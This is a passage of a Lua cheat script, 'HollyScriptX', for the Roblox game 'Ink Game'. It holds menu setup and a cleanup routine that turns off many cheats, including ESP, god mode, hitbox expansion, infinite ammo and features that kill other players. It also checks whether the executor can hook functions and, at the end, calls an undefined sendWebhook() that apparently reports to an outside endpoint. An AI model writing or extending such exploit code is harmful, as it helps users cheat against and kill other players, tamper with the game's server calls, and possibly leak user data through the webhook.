    Text = "Notification Side",
    Default = "Right",
    Values = { "Left", "Right" }
})

MenuBox:AddLabel("Menu bind"):AddKeyPicker("MenuKeybind", {
    NoUI = true,
    Default = "Z",
    Text = "Menu keybind"
})

MenuBox:AddDropdown("DPIDropdown", {
    Tooltip = "Set custom size for gui",
    Callback = function(Value)
        Library:SetDPIScale(Value)
        PlayBell()
    end,
    Text = "DPI Scale",
    Default = "100",
    Values = { "50", "75", "80", "85", "90", "100", "125", "150", "175", "200" }
})

MainModule.CleanupEverything = function()
    MainModule.ToggleAutoWin(false)
    MainModule.ToggleRebel(false)
    MainModule.ToggleFly(false, true)
    MainModule.ToggleESP(false)
    MainModule.ToggleSpeedHack(false)
    MainModule.ToggleRemoveStun(false)
    MainModule.ToggleFOV(false)
    MainModule.ToggleFullbright(false)
    MainModule.ToggleAmbience(false)
    MainModule.ToggleHitboxExpander(false)
    MainModule.ToggleRapidFire(false)
    MainModule.ToggleInfiniteAmmo(false)
    MainModule.ToggleAutoNextGame(false)
    MainModule.ToggleAutoSafe(false)
    MainModule.ToggleAutoDodge(false)
    MainModule.ToggleAutoEscape(false)
    MainModule.ToggleAutoPickup(false)
    MainModule.ToggleFreeGuard(false)
    MainModule.ToggleEffectShooter(false)
    MainModule.ToggleFaceTarget(false)
    MainModule.TogglePlayerAttach(false)
    MainModule.ToggleGodMode(false)
    MainModule.ToggleRemoveInjury(false)
    MainModule.ToggleAntiBreak(false)
    MainModule.ToggleJumpRopeAntiFall(false)
    MainModule.ToggleGlassESP(false)
    MainModule.ToggleSpikesKill(false)
    MainModule.ToggleSpikesPlatformTeleport(false)
    MainModule.ToggleKeyESP(false)
    MainModule.ToggleExitDoorESP(false)
    MainModule.ToggleEspGuards(false)
    MainModule.ToggleGuardHitbox(false)
    MainModule.ToggleSkySquidAntiFall(false)
    MainModule.ToggleVoidKill(false)
    MainModule.ToggleMingleVoidKill(false)
    MainModule.ToggleZoneKill(false)
    MainModule.ToggleAutoChoke(false)
    MainModule.ToggleInfiniteStamina(false)
    MainModule.ToggleDesync(false)
    
    MainModule.stopEmote()
    
    if MainModule.AutoWinConnection then
        MainModule.AutoWinConnection:Disconnect()
        MainModule.AutoWinConnection = nil
    end
    
    if MainModule.Rebel.Connection then
        MainModule.Rebel.Connection:Disconnect()
        MainModule.Rebel.Connection = nil
    end
    
    if MainModule.Fly.Connection then
        MainModule.Fly.Connection:Disconnect()
        MainModule.Fly.Connection = nil
    end
    if MainModule.Fly.BodyVelocity then
        MainModule.Fly.BodyVelocity:Destroy()
        MainModule.Fly.BodyVelocity = nil
    end
    
    if MainModule.SpeedHackLoop then
        task.cancel(MainModule.SpeedHackLoop)
        MainModule.SpeedHackLoop = nil
    end
    
    if MainModule.FOVConnection then
        MainModule.FOVConnection:Disconnect()
        MainModule.FOVConnection = nil
    end
    
    if MainModule.FullbrightConnection then
        MainModule.FullbrightConnection:Disconnect()
        MainModule.FullbrightConnection = nil
    end
    
    if MainModule.ambienceConnection then
        MainModule.ambienceConnection:Disconnect()
        MainModule.ambienceConnection = nil
    end
    if MainModule.timeFixConnection then
        MainModule.timeFixConnection:Disconnect()
        MainModule.timeFixConnection = nil
    end
    if MainModule.motionBlur then
        MainModule.motionBlur:Destroy()
        MainModule.motionBlur = nil
    end
    
    if MainModule.AutoDodge.HeartbeatConnection then
        MainModule.AutoDodge.HeartbeatConnection:Disconnect()
        MainModule.AutoDodge.HeartbeatConnection = nil
    end
    for _, conn in pairs(MainModule.AutoDodge.Connections) do
        if conn then pcall(function() conn:Disconnect() end) end
    end
    MainModule.AutoDodge.Connections = {}
    
    if MainModule.AutoDodge.Remote and MainModule.AutoDodge.OriginalFireServer then
        pcall(function()
            MainModule.AutoDodge.Remote.FireServer = MainModule.AutoDodge.OriginalFireServer
        end)
    end
    
    if MainModule.AutoEscapeConnection then
        MainModule.AutoEscapeConnection:Disconnect()
        MainModule.AutoEscapeConnection = nil
    end
    
    for _, platform in pairs(MainModule.SafetyPlatforms) do
        if platform then pcall(function() platform:Destroy() end) end
    end
    MainModule.SafetyPlatforms = {}
    if MainModule.AntiBreakConn then
        MainModule.AntiBreakConn:Disconnect()
        MainModule.AntiBreakConn = nil
    end
    
    if MainModule.JumpRopeAntiFall.Conn then
        MainModule.JumpRopeAntiFall.Conn:Disconnect()
        MainModule.JumpRopeAntiFall.Conn = nil
    end
    if MainModule.JumpRopeAntiFall.Platform then
        MainModule.JumpRopeAntiFall.Platform:Destroy()
        MainModule.JumpRopeAntiFall.Platform = nil
    end
    
    pcall(function()
        local gh = Workspace:FindFirstChild("GlassBridge") and Workspace.GlassBridge:FindFirstChild("GlassHolder")
        if gh then
            for _, l in pairs(gh:GetChildren()) do
                for _, gm in pairs(l:GetChildren()) do
                    if gm:IsA("Model") then
                        for _, p in pairs(gm:GetDescendants()) do
                            if p:IsA("BasePart") and p:GetAttribute("GlassPart") then
                                p.Color = Color3.fromRGB(163, 162, 165)
                                p.Material = Enum.Material.Glass
                                p.Transparency = 0
                            end
                        end
                    end
                end
            end
        end
    end)
    
    for part, props in pairs(MainModule.ModifiedParts) do
        if part and part.Parent then
            pcall(function()
                part.Size = props.Size
                part.CanCollide = props.CanCollide
                part.Transparency = props.Transparency
            end)
        end
    end
    MainModule.ModifiedParts = {}
    
    for o, v in pairs(MainModule.OriginalFireRates) do
        if o and o.Parent then pcall(function() o.Value = v end) end
    end
    MainModule.OriginalFireRates = {}
    
    for o, v in pairs(MainModule.OriginalAmmo) do
        if o and o.Parent then pcall(function() o.Value = v end) end
    end
    MainModule.OriginalAmmo = {}
    
    local c = MainModule.GetCharacter()
    if c then
        local h = MainModule.GetHumanoid(c)
        if h then
            pcall(function() h.WalkSpeed = 16 end)
        end
    end
    
    MainModule.ClearESP()
    
    if MainModule.EspGuardsThread then
        task.cancel(MainModule.EspGuardsThread)
        MainModule.EspGuardsThread = nil
    end
    for part, box in pairs(MainModule.EspGuardsBoxes) do
        if box then pcall(function() box:Destroy() end) end
    end
    MainModule.EspGuardsBoxes = {}
    
    if MainModule.ExitDoorESPThread then
        task.cancel(MainModule.ExitDoorESPThread)
        MainModule.ExitDoorESPThread = nil
    end
    for _, obj in pairs(MainModule.ExitDoorESPObjects) do
        if obj then pcall(function() obj:Destroy() end) end
    end
    MainModule.ExitDoorESPObjects = {}
    
    for _, esp in pairs(MainModule.KeyESPBoxes) do
        if esp then pcall(function() esp:Destroy() end) end
    end
    MainModule.KeyESPBoxes = {}
    if MainModule.KeyESPConnection then
        MainModule.KeyESPConnection:Disconnect()
        MainModule.KeyESPConnection = nil
    end
    
    if MainModule.SpikesKillFeature.PlatformPart then
        pcall(function() MainModule.SpikesKillFeature.PlatformPart:Destroy() end)
        MainModule.SpikesKillFeature.PlatformPart = nil
    end
    if MainModule.SpikesKillFeature.AnimationConnection then
        MainModule.SpikesKillFeature.AnimationConnection:Disconnect()
        MainModule.SpikesKillFeature.AnimationConnection = nil
    end
    if MainModule.SpikesKillFeature.CharacterAddedConnection then
        MainModule.SpikesKillFeature.CharacterAddedConnection:Disconnect()
        MainModule.SpikesKillFeature.CharacterAddedConnection = nil
    end
    if MainModule.SpikesKillFeature.SafetyCheckConnection then
        MainModule.SpikesKillFeature.SafetyCheckConnection:Disconnect()
        MainModule.SpikesKillFeature.SafetyCheckConnection = nil
    end
    if MainModule.SpikesKillFeature.AnimationCheckConnection then
        MainModule.SpikesKillFeature.AnimationCheckConnection:Disconnect()
        MainModule.SpikesKillFeature.AnimationCheckConnection = nil
    end
    for _, conn in pairs(MainModule.SpikesKillFeature.AnimationStoppedConnections) do
        pcall(function() conn:Disconnect() end)
    end
    MainModule.SpikesKillFeature.AnimationStoppedConnections = {}
    
    if MainModule.SpikesPlatformTeleport.Platform then
        pcall(function() MainModule.SpikesPlatformTeleport.Platform:Destroy() end)
        MainModule.SpikesPlatformTeleport.Platform = nil
    end
    if MainModule.SpikesPlatformTeleport.Connection then
        MainModule.SpikesPlatformTeleport.Connection:Disconnect()
        MainModule.SpikesPlatformTeleport.Connection = nil
    end
    
    if MainModule.ZoneKillFeature.AnimationConnection then
        MainModule.ZoneKillFeature.AnimationConnection:Disconnect()
        MainModule.ZoneKillFeature.AnimationConnection = nil
    end
    if MainModule.ZoneKillFeature.CharacterAddedConnection then
        MainModule.ZoneKillFeature.CharacterAddedConnection:Disconnect()
        MainModule.ZoneKillFeature.CharacterAddedConnection = nil
    end
    if MainModule.ZoneKillFeature.AnimationCheckConnection then
        MainModule.ZoneKillFeature.AnimationCheckConnection:Disconnect()
        MainModule.ZoneKillFeature.AnimationCheckConnection = nil
    end
    for _, conn in pairs(MainModule.ZoneKillFeature.AnimationStoppedConnections) do
        pcall(function() conn:Disconnect() end)
    end
    MainModule.ZoneKillFeature.AnimationStoppedConnections = {}
    
    if MainModule.VoidKillConn then
        MainModule.VoidKillConn:Disconnect()
        MainModule.VoidKillConn = nil
    end
    if MainModule.VoidKillCharConn then
        MainModule.VoidKillCharConn:Disconnect()
        MainModule.VoidKillCharConn = nil
    end
    
    for _, conn in pairs(MainModule.MingleConns) do
        pcall(function() conn:Disconnect() end)
    end
    MainModule.MingleConns = {}
    
    if MainModule.SkySquidAntiFall.Platform then
        pcall(function() MainModule.SkySquidAntiFall.Platform:Destroy() end)
        MainModule.SkySquidAntiFall.Platform = nil
    end
    if MainModule.SkySquidAntiFall.Conn then
        MainModule.SkySquidAntiFall.Conn:Disconnect()
        MainModule.SkySquidAntiFall.Conn = nil
    end
    
    if MainModule.GuardHitboxConnection then
        MainModule.GuardHitboxConnection:Disconnect()
        MainModule.GuardHitboxConnection = nil
    end
    for part, originalSize in pairs(MainModule.GuardOriginalSizes) do
        if part and part.Parent then
            pcall(function() part.Size = originalSize end)
        end
    end
    MainModule.GuardOriginalSizes = {}
    
    if MainModule.StaminaConns then
        for _, conn in pairs(MainModule.StaminaConns) do
            pcall(function() conn:Disconnect() end)
        end
        MainModule.StaminaConns = {}
    end
    
    if MainModule.GameStateMonitor.Connection then
        MainModule.GameStateMonitor.Connection:Disconnect()
        MainModule.GameStateMonitor.Connection = nil
    end
    
    if MainModule.noclipButton then
        pcall(function() MainModule.noclipButton:Destroy() end)
        MainModule.noclipButton = nil
    end
    if MainModule.noclipConnection then
        MainModule.noclipConnection:Disconnect()
        MainModule.noclipConnection = nil
    end
    
    if MainModule.attachConnection then
        MainModule.attachConnection:Disconnect()
        MainModule.attachConnection = nil
    end
    if MainModule.autoSearchConnection then
        MainModule.autoSearchConnection:Disconnect()
        MainModule.autoSearchConnection = nil
    end
    
    MainModule.destroySquares()
    
    if MainModule.CurrentBodyVelocity then
        MainModule.CurrentBodyVelocity:Destroy()
        MainModule.CurrentBodyVelocity = nil
    end
    
    if MainModule.FaceTargetModule.Connection then
        MainModule.FaceTargetModule.Connection:Disconnect()
        MainModule.FaceTargetModule.Connection = nil
    end
    MainModule.FaceTargetModule.Enabled = false
    
    MainModule.FullbrightEnabled = false
    MainModule.RemoveStunEnabled = false
    MainModule.AutoWinEnabled = false
    MainModule.AutoDodge.Enabled = false
    MainModule.AutoDodge.ActiveAnimations = {}
    MainModule.AutoDodge.LastAnimationStartTime = {}
    MainModule.AutoDodge.LastDodgeTime = 0
    
    local Lighting = game:GetService("Lighting")
    if MainModule.FullbrightSettings.Brightness then
        Lighting.Brightness = MainModule.FullbrightSettings.Brightness
        Lighting.ClockTime = MainModule.FullbrightSettings.ClockTime
        Lighting.FogEnd = MainModule.FullbrightSettings.FogEnd
        Lighting.GlobalShadows = MainModule.FullbrightSettings.GlobalShadows
        Lighting.OutdoorAmbient = MainModule.FullbrightSettings.OutdoorAmbient
        Lighting.Ambient = MainModule.FullbrightSettings.Ambient
    end
    
    pcall(function()
        workspace.CurrentCamera.FieldOfView = 70
    end)
    
    MainModule.Fly.Enabled = false
    MainModule.Fly.Speed = 45
    MainModule.SpeedHackEnabled = false
    MainModule.SpeedValue = 39
    MainModule.FOVEnabled = false
    MainModule.FOVValue = 120
    MainModule.AmbienceEnabled = false
    MainModule.HitboxEnabled = false
    MainModule.RapidFireEnabled = false
    MainModule.InfiniteAmmoEnabled = false
    MainModule.AutoNextEnabled = false
    MainModule.AutoSafe.Enabled = false
    MainModule.AutoSafe.HasTeleported = false
    MainModule.AutoSafe.LowHPChecked = false
    MainModule.AutoEscapeEnabled = false
    MainModule.AutoPickupEnabled = false
    MainModule.FreeGuardSettings.Enabled = false
    MainModule.EffectShooter.Enabled = false
    MainModule.PlayerAttachEnabled = false
    MainModule.GodModeEnabled = false
    MainModule.RemoveInjuryEnabled = false
    MainModule.AntiBreakEnabled = false
    MainModule.JumpRopeAntiFall.Enabled = false
    MainModule.GlassESPEnabled = false
    MainModule.SpikesKillFeature.Enabled = false
    MainModule.SpikesPlatformTeleport.Enabled = false
    MainModule.KeyESPEnabled = false
    MainModule.ExitDoorESPEnabled = false
    MainModule.EspGuardsEnabled = false
    MainModule.GuardHitboxEnabled = false
    MainModule.SkySquidAntiFall.Enabled = false
    MainModule.VoidKillEnabled = false
    MainModule.MingleVoidKillEnabled = false
    MainModule.ZoneKillFeature.Enabled = false
    MainModule.AutoChokeEnabled = false
    MainModule.InfStaminaActive = false
    MainModule.noclipEnabled = false
end

MenuBox:AddButton("Unload Script", function()
    Library:Unload()
    MainModule.CleanupEverything()
end, {Tooltip = "Unloads the script and cleans up all features"})

local executorName = "Unknown"
local hookSupported = false

if identifyexecutor and type(identifyexecutor) == "function" then
    executorName = identifyexecutor()
end

MainModule.checkHookSupport = function()
    if not (getrawmetatable and hookfunction and setreadonly) then
        return false
    end
    
    local testFunction = function() return "original" end
    local hookTest = false
    
    local success = pcall(function()
        local oldFunc
        oldFunc = hookfunction(testFunction, function(...)
            hookTest = true
            return oldFunc(...)
        end)
        
        testFunction()
    end)
    
    return success and hookTest
end

hookSupported = MainModule.checkHookSupport()

executorInfo = InfoBox:AddLabel("whonixx - script owner")
InfoBox:AddLabel("bloodfate - script owner")
InfoBox:AddLabel("insected - helped with obf/dc server")
InfoBox:AddLabel("chillnie - script tester/co-owner")
InfoBox:AddLabel("rezorn - script helper/developer")

Library.ToggleKeybind = Library.Options.MenuKeybind

ThemeManager:SetLibrary(Library)
SaveManager:SetLibrary(Library)

SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({ "MenuKeybind" })

ThemeManager:SetFolder("HollyScriptX")
SaveManager:SetFolder("HollyScriptX")

SaveManager:BuildConfigSection(UISettingsTab)
ThemeManager:ApplyToTab(UISettingsTab)
SaveManager:LoadAutoloadConfig()

task.defer(function()
    pcall(function()
        local Lighting = game:GetService("Lighting")
        
        local savedTheme = nil
        if ThemeManager and ThemeManager.GetCurrentTheme then
            savedTheme = ThemeManager.GetCurrentTheme()
        end
        
        if savedTheme then
            ThemeManager:SetTheme(savedTheme)
        else
            Library:UpdateColorsUsingRegistry()
        end
    end)
end)

task.defer(function()
    task.wait(0.5)
    MainModule.UpdateAllTogglesByGame()
end)

task.spawn(function()
    task.wait(2)
    
    local function ModdedUI()
        for _, option in pairs(Options) do
            if option.Type == "Dropdown" and option.Holder then
                local display = option.Holder:FindFirstChildWhichIsA("TextButton")
                if display and not display._SoundAdded then
                    display._SoundAdded = true
                    local oldClick = display.MouseButton1Click
                    display.MouseButton1Click:Connect(function()
                        PlayToggleSound()
                    end)
                end
            end
        end
    end
    
    ModdedUI()
    
    local function WatchForNewDropdowns()
        local existing = {}
        for _, option in pairs(Options) do
            if option.Type == "Dropdown" then
                existing[option] = true 
            end
        end
        
        while true do
            task.wait(0.5)
            for _, option in pairs(Options) do
                if option.Type == "Dropdown" and not existing[option] then
                    existing[option] = true
                    local display = option.Holder and option.Holder:FindFirstChildWhichIsA("TextButton")
                    if display then
                        display.MouseButton1Click:Connect(function()
                            PlayToggleSound()
                        end)
                    end
                end
            end
        end
    end
    
    task.spawn(WatchForNewDropdowns)
end)
task.spawn(function()
    task.wait(1)
    sendWebhook()
end)

Library.Notify("HollyScriptX", "Ink Game", 0.9)
